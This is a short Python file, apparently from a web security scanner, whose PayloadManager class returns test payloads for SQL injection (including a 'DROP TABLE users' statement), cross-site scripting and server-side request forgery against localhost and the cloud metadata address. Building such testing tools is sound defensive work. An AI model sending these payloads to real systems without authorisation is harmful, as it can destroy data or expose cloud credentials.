# core/payloads.py
class PayloadManager:
    def get_sqli_payloads(self):
        return ["' OR 1=1 --", "1; DROP TABLE users --"]

    def get_xss_payloads(self):
        return ["<script>alert('xss')</script>", "<img src=x onerror=alert('xss')>"]

    def get_ssrf_payloads(self):
        return ["http://localhost", "http://127.0.0.1", "http://169.254.169.254"]